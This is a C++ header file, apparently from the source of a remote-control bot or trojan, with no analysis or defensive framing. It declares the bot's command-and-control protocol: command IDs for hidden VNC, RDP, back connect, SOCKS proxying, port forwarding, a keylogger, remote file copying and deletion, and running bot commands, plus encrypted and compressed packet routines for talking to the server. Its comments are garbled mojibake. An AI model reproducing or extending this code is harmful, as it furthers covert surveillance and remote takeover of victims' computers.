#pragma once

#include <limits.h>
#include "core\core.h"
#include "core\socket.h"
#include "core\PipeSocket.h"
#include "lzw.h"
#include "https.h"

namespace WndRec
{

//��� �������
const int ID_VIDEO = 1;
const int ID_FILE_ADD = 2;
const int ID_FILE_NEW = 3;
const int ID_SIZE_FILE = 4;
const int ID_VNC_CONNECT = 6;
const int ID_PORT_FORWARD = 7;
const int ID_SET_UID = 8;
const int ID_PING = 9;
const int ID_INFO = 10;
const int ID_BREAK_VIDEO = 16;
const int ID_EXIT = 17; //�����, ���������� ������, � ������������ ������ (int - 4 �����) ���������� ��������: 1 - ����� �� ��������
const int ID_LOG = 18; //������� ����� �� ������
const int ID_VIDEO_BEG = 19; //������ ��� ��������� ������ �����
const int ID_BOT_WORK = 20; //������ � ������� ��������� �� ��� �����-�� �������������� ������ (�������� ������� �����)
const int ID_RDP = 21; //������ ��������� ������� �� RDP
const int ID_VNC = 22; //������ ��������� ������� �� VNC
const int ID_BC = 23; //������ back connect
const int ID_DUPL = 24; //������������ �������
const int ID_CMD_BOT = 27; //������� ���� � ���� ��������� ������: cmd arg1 arg2
const int ID_VNCDLL = 28; //������ ��������� ������� �� VNCDLL
const int ID_SOCKS_ON_OFF = 29; //�������� ��� ��������� socks
const int ID_CONNECTED = 30; //��� ���������� ��� ������������ (���������� ��������� ConnectToServer ��� CloseServer)
const int ID_STREAM_RECREATE = 31; //������������ ������, ������������ ��� ����������� �������
const int ID_PLUGIN = 32; //�������� ������� � �������
const int ID_PIPE = 33; //������� ������ pipe ������

const int ID_FT_DIR = 34; //�������� ������ ������ � ��������� �����
const int ID_FT_COPY_SB = 35; //����������� ����� � ������� �� ���
const int ID_FT_COPY_BS = 36; //����������� ����� � ���� �� ������
const int ID_FT_MKDIR = 37; //�������� ����� �� ������� ����
const int ID_FT_DEL = 38; //�������� ����� ��� ����� �� ������� ����
const int ID_SET_UID2 = 39; //�� ���� � ����� ������ ����
const int ID_XOR_MASK = 40; //����� ��� �����������-�������� �������
const int ID_HVNC = 41; //������ ��������� ������� �� HVNC
const int ID_FT_STOPCOPY = 42; //���������� �������� ����������� �����
const int ID_SLEEP = 43; //����������� �� ��������� ���������� �����

const int ID_SOCKS = 51; //������ ��� ������ 
const int ID_KEYLOGGER = 52; //������ ����������
const int ID_STREAM_CREATE = 53; //�������� ������
const int ID_STREAM_DATA = 54; //������ ������
const int ID_STREAM_CLOSE = 55; //�������� ������
const int ID_PORTFORWARD_ON_OFF = 56; //�������� ��� ��������� ������� �����
const int ID_PORTFORWARD = 57; //������ ��� ��������������� �����
const int ID_SENDSTR = 58; //��������� ��� ���������� ������
const int ID_BC_PORT = 59; //�� ������� ���� ���� ������� ��� ����������

struct SenderBuf
{
	Mem::Data bufHead; //����� ��� ������ ��������� ������
	Mem::Data bufForRead; //����� ��� ������ � ������
	Mem::Data publicKey, aesKey;
	char* bufForLzw; //����� ��� ������ � �������� ������
	LZWcode* codes;
//	byte mask[64]; //����� ��� ����������
//	int c_mask; //����� �����
	byte verPacket; //� ����� ������� ������� �������� (������� �� �������)
	bool rsa; //true - ���������� rsa ����������, ����� aes
	int realBytes; //����� ������ ���������� ������
	int lzwBytes; //������ ������ � ������ ����
};

//��������� �������������� �� ������ �������� �������
#pragma warning ( disable : 4200 )

//��������� ������ ������������ �������� ID_SENDSTR
struct StrServer
{
	int id; //�� ������
	int subId; //����� ������
	int c_s; //������ ������
	char s[0]; //������ (� ����� 0 ����������)
};

struct IOServer
{
	int typeIO; //0 - ����������, 1 - �����, 2 - pipe, 3 - https
	int sc;
	union
	{
		PipeSocketClient* pipe;
		HTTPS* https;
	};

	void Init();

	bool ConnectIP( const char* ip, int port );
	bool ConnectPipe( const char* namePipe );
	bool ConnectHttps( const char* ip );

	void Close();
	int Write( Mem::Data& data );
	int Read( Mem::Data& data, int maxRead, int wait );
	bool Connected();
};

bool WritePacket( SenderBuf* sb, int cmd, IOServer& io, void* data, int c_data, uint id = 0 );
//���� � *data = -1, �� ���� ������� ����� ������ ������ ���� ����� ������, ����� � *data �����
//����� ���������� ������, ������� ����� ����� ����� �������
int ReadPacket( SenderBuf* sb, int& cmd, IOServer& io, void** data, int wait = INT_MAX, uint* id = 0 );

SenderBuf* InitPacketBuf( byte* mask, int c_mask );
void ReleasePacketBuf(SenderBuf*);
void ResetBuf(SenderBuf*);
//������� ����� ������� ������������� �� ������, ���������� ��� �������� ������ ���������� ������������
//���������� �������������� �����, ������� ����� ����� �������� �������, ������ ������ ����� � c_packet
//begSize - ������� ������ �������� ����� ������� ������, ��� ������ ����� ��������� ���������� ������� ������ �������
void* CreateRawPacket( int begSize, int cmd, const void* data, int c_data, int& c_packet );

bool EncryptRSA( const Mem::Data& key, Mem::Data& data );
bool EncryptAES256( const Mem::Data& key, Mem::Data& data );
bool DecryptAES256( const Mem::Data& key, Mem::Data& data, int offset );
bool GenAES256Key( Mem::Data& key );


}
